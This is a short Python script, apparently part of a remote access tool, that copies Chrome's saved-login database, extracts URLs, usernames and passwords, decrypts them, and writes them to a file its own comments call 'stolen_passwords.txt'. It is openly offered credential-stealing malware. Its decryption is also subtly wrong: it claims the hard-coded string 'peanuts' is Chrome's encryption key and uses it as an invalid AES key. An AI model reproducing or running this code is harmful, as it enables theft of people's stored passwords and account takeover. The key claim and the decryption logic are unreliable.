import os
import sqlite3
import win32crypt
import shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta

def get_chrome_datetime(chromedate):
    """Convert Chrome's datetime to a human-readable format."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def decrypt_data(data, key):
    """Decrypt the given data using the provided key."""
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data).decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def main():
    # Path to the Chrome user data directory
    user_data_dir = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")
    # Path to the login data file
    login_data_path = os.path.join(user_data_dir, "Login Data")

    # Copy the login data file to a temporary location
    temp_login_data_path = os.path.join("C:\\", "FRAT", "Login Data")
    shutil.copyfile(login_data_path, temp_login_data_path)

    # Connect to the SQLite database
    conn = sqlite3.connect(temp_login_data_path)
    cursor = conn.cursor()

    # Select the passwords
    cursor.execute("SELECT action_url, username_value, password_value, date_created, date_last_used FROM logins")
    logins = cursor.fetchall()

    # Open a file to write the stolen passwords
    with open(os.path.join("C:\\", "FRAT", "stolen_passwords.txt"), "w") as f:
        for login in logins:
            url = login[0]
            username = login[1]
            password = decrypt_data(login[2], b'peanuts')  # Chrome's encryption key
            date_created = get_chrome_datetime(login[3])
            date_last_used = get_chrome_datetime(login[4])
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Created: {date_created}\n")
            f.write(f"Last Used: {date_last_used}\n")
            f.write("-" * 40 + "\n")

    # Close the database connection
    cursor.close()
    conn.close()

    # Remove the temporary login data file
    os.remove(temp_login_data_path)

if __name__ == "__main__":
    main()